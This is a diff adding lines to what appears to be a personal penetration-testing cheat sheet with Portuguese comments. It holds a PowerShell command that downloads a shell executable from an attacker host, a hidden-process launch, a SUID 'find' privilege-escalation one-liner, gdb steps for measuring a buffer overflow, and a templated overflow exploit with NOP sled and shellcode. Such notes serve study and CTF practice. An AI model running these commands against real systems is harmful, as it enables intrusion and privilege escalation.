@@ -198,6 +198,20 @@ Start-Process "shell-name.exe" #Processo escondido em powershell
 
 powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"  #Download via Powershell
 
+find . -exec /bin/sh -p \; -quit    # escalar priv com find
+
+gdb -q ./binario     # debugar com gdb
+
+set disassembly-flavor <intel/amd>   #setar o disassembler para a arquitetura que estamos usando
+
+r < <(echo Aa0Aa1Aa2...)   #testar para ver até quantos bytes o buffer vai
+
+i r  #verificar endereço sobreescrito
+
+x/xg $<registrador> #verificar o valor dentro do registrador
+
+(python -c "print('\x90'*(fill in the number) + (shellcode) + 'A'*(fill in the number) +(return address))";cat) | ./<binário>   #explorar o buffer overflow no binário em c
+
 
 
 
